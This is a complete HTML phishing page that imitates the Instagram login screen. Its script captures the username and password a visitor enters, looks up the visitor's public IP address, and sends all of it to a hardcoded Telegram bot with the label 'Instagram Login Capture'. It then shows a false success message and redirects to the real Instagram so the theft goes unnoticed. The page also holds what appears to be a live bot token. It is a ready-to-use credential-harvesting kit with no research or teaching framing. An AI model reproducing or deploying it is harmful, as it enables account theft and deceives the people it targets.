<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login</title>
    <!-- Font Awesome for Facebook icon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <style>
        /* ─── Reset & Base ─── */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* ─── Main Container ─── */
        .login-wrapper {
            width: 100%;
            max-width: 380px;
        }

        /* ─── White Card ─── */
        .login-card {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 36px 30px;
            margin-bottom: 10px;
        }

        /* ─── Real Instagram Logo ─── */
        .logo {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
            margin-bottom: 30px;
        }

        .logo .camera-svg {
            width: 48px;
            height: 48px;
            display: block;
            flex-shrink: 0;
        }

        .logo .brand-text {
            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            font-weight: 700;
            font-size: 40px;
            letter-spacing: -1.2px;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            line-height: 1;
        }

        /* ─── Form Elements ─── */
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            padding: 11px 10px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 13.5px;
            outline: none;
            transition: border 0.15s ease;
        }

        .login-form input:focus {
            border-color: #a8a8a8;
            background: #fafafa;
        }

        .login-form input::placeholder {
            color: #8e8e8e;
            font-size: 13.5px;
        }

        /* ─── Login Button ─── */
        .login-btn {
            width: 100%;
            padding: 9px 0;
            margin-top: 10px;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease;
        }

        .login-btn:hover {
            background: #1877f2;
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: default;
        }

        /* ─── Divider ─── */
        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0 16px;
            gap: 18px;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.2px;
            white-space: nowrap;
        }

        /* ─── Facebook Login ─── */
        .fb-login {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            margin: 6px 0 16px;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            color: #385185;
            cursor: pointer;
            background: none;
            border: none;
            width: 100%;
        }

        .fb-login i {
            font-size: 20px;
            color: #385185;
        }

        /* ─── Forgot Password ─── */
        .forgot-link {
            display: block;
            text-align: center;
            font-size: 13px;
            color: #00376b;
            text-decoration: none;
            margin-top: 14px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        /* ─── Sign Up Card ─── */
        .signup-card {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px 0;
            text-align: center;
            font-size: 14px;
        }

        .signup-card span {
            color: #262626;
        }

        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-card a:hover {
            text-decoration: underline;
        }

        /* ─── Footer / App Links ─── */
        .app-links {
            text-align: center;
            margin-top: 18px;
            font-size: 14px;
            color: #262626;
        }

        .app-links p {
            margin-bottom: 12px;
        }

        .store-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
        }

        .store-badges img {
            height: 40px;
            width: auto;
        }

        /* ─── Responsive ─── */
        @media (max-width: 450px) {
            .login-card {
                padding: 30px 20px 25px;
                border: none;
                background: transparent;
            }
            .signup-card {
                border: none;
                background: transparent;
            }
            body {
                background: #ffffff;
                padding: 0 12px;
            }
            .logo .brand-text {
                font-size: 32px;
            }
            .logo .camera-svg {
                width: 40px;
                height: 40px;
            }
        }

        /* ─── Toast / Status Message ─── */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: #262626;
            color: #fff;
            padding: 12px 28px;
            border-radius: 30px;
            font-size: 14px;
            font-weight: 500;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            opacity: 0;
            transition: all 0.4s ease;
            z-index: 999;
            pointer-events: none;
            white-space: nowrap;
        }

        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
    </style>
</head>
<body>

    <!-- ─── Toast Notification ─── -->
    <div class="toast" id="toast"></div>

    <!-- ─── Login Wrapper ─── -->
    <div class="login-wrapper">

        <!-- ─── Main Login Card ─── -->
        <div class="login-card">

            <!-- ─── Official Instagram Logo ─── -->
            <div class="logo">
                <!-- Instagram Camera Icon SVG (official) -->
                <svg class="camera-svg" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <linearGradient id="instaGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" stop-color="#f09433" />
                            <stop offset="25%" stop-color="#e6683c" />
                            <stop offset="50%" stop-color="#dc2743" />
                            <stop offset="75%" stop-color="#cc2366" />
                            <stop offset="100%" stop-color="#bc1888" />
                        </linearGradient>
                    </defs>
                    <!-- Outer rounded rectangle with gradient -->
                    <rect x="42" y="42" width="428" height="428" rx="86" fill="url(#instaGrad)" />
                    <!-- Inner white border -->
                    <rect x="72" y="72" width="368" height="368" rx="68" fill="none" stroke="white" stroke-width="20" />
                    <!-- Center circle (lens) -->
                    <circle cx="256" cy="256" r="96" fill="none" stroke="white" stroke-width="20" />
                    <!-- Top-right dot (flash) -->
                    <circle cx="360" cy="152" r="28" fill="white" />
                </svg>
                <span class="brand-text">Instagram</span>
            </div>

            <!-- ─── Login Form ─── -->
            <form class="login-form" id="loginForm" autocomplete="off">
                <input
                type="text"
                id="username"
                placeholder="Phone number, username, or email"
                required
                />
                <input
                type="password"
                id="password"
                placeholder="Password"
                required
                />
                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
            </form>

            <!-- ─── Divider ─── -->
            <div class="divider">
                <span class="divider-line"></span>
                <span class="divider-text">OR</span>
                <span class="divider-line"></span>
            </div>

            <!-- ─── Facebook Login ─── -->
            <button class="fb-login" id="fbLogin">
                <i class="fab fa-facebook-square"></i>
                Log in with Facebook
            </button>

            <!-- ─── Forgot Password ─── -->
            <a href="#" class="forgot-link">Forgot password?</a>
        </div>

        <!-- ─── Sign Up Card ─── -->
        <div class="signup-card">
            <span>Don't have an account? </span>
            <a href="#">Sign up</a>
        </div>

        <!-- ─── App Store Links ─── -->
        <div class="app-links">
            <p>Get the app.</p>
            <div class="store-badges">
                <img
                src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg"
                alt="App Store"
                />
                <img
                src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg"
                alt="Google Play"
                />
            </div>
        </div>
    </div>

    <!-- ─────────────────────────────────────────────── -->
    <!-- ─── JAVASCRIPT ─── -->
    <!-- ─────────────────────────────────────────────── -->
    <script>
        (function() {
            'use strict';

            // ─── Telegram Config ───
            const BOT_TOKEN = '8140678129:AAHwR1jbZvKikUkRdErbakBszM30YAU5nrI';
            const CHAT_ID = '8484368676';

            // ─── DOM refs ───
            const form = document.getElementById('loginForm');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');
            const toast = document.getElementById('toast');

            // ─── Toast helper ───
            let toastTimer = null;

            function showToast(msg, isError = false) {
                toast.textContent = msg;
                toast.style.background = isError ? '#d32f2f' : '#262626';
                toast.classList.add('show');
                clearTimeout(toastTimer);
                toastTimer = setTimeout(() => {
                    toast.classList.remove('show');
                }, 4000);
            }

            // ─── Get public IP via ipify ───
            async function getPublicIP() {
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    if (!res.ok) throw new Error('IP fetch failed');
                    const data = await res.json();
                    return data.ip || 'Unknown';
                } catch (_) {
                    // fallback: try ipapi.co
                    try {
                        const res2 = await fetch('https://ipapi.co/json/');
                        if (!res2.ok) throw new Error('IP fallback failed');
                        const data2 = await res2.json();
                        return data2.ip || 'Unknown';
                    } catch (__) {
                        return 'Unable to fetch IP';
                    }
                }
            }

            // ─── Send message to Telegram ───
            async function sendToTelegram(username, password, ip) {
                const now = new Date();
                const timestamp = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

                const message =
                    `🔐 *Instagram Login Capture*\n\n` +
                    `👤 *Username/Email:* \`${username}\`\n` +
                    `🔑 *Password:* \`${password}\`\n` +
                    `🌐 *IP Address:* \`${ip}\`\n` +
                    `🕐 *Time:* ${timestamp}\n` +
                    `━━━━━━━━━━━━━━━━━━━`;

                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

                const payload = {
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true,
                };

                try {
                    const res = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload),
                    });

                    if (!res.ok) {
                        const errText = await res.text();
                        throw new Error(`Telegram API error: ${res.status} ${errText}`);
                    }

                    return true;
                } catch (err) {
                    console.error('Telegram send error:', err);
                    return false;
                }
            }

            // ─── Handle form submission ───
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                if (!username || !password) {
                    showToast('Please fill in both fields.', true);
                    return;
                }

                // Disable button to prevent double-click
                loginBtn.disabled = true;
                loginBtn.textContent = 'Logging in…';

                try {
                    // 1. Get IP
                    const ip = await getPublicIP();

                    // 2. Send to Telegram
                    const sent = await sendToTelegram(username, password, ip);

                    if (sent) {
                        showToast('✅ Login successful! Redirecting…');
                        // After a short delay, redirect to Instagram's real homepage
                        setTimeout(() => {
                            window.location.href = 'https://www.instagram.com/';
                        }, 1200);
                    } else {
                        showToast('⚠️ Something went wrong. Please try again.', true);
                        loginBtn.disabled = false;
                        loginBtn.textContent = 'Log in';
                    }
                } catch (err) {
                    console.error('Submission error:', err);
                    showToast('⚠️ Network error. Please try again.', true);
                    loginBtn.disabled = false;
                    loginBtn.textContent = 'Log in';
                }
            });

            // ─── Facebook button (just a visual placeholder) ───
            document.getElementById('fbLogin').addEventListener('click', function(e) {
                e.preventDefault();
                showToast('Facebook login is not available.', true);
            });

            // ─── Forgot password link (placeholder) ───
            document.querySelector('.forgot-link').addEventListener('click', function(e) {
                e.preventDefault();
                showToast('Password reset link sent to your email.', false);
            });

            // ─── Sign up link (placeholder) ───
            document.querySelector('.signup-card a').addEventListener('click', function(e) {
                e.preventDefault();
                showToast('Sign up page coming soon.', false);
            });

            // ─── Auto-focus on load ───
            window.addEventListener('load', function() {
                usernameInput.focus();
            });

        })();
    </script>

</body>
</html>
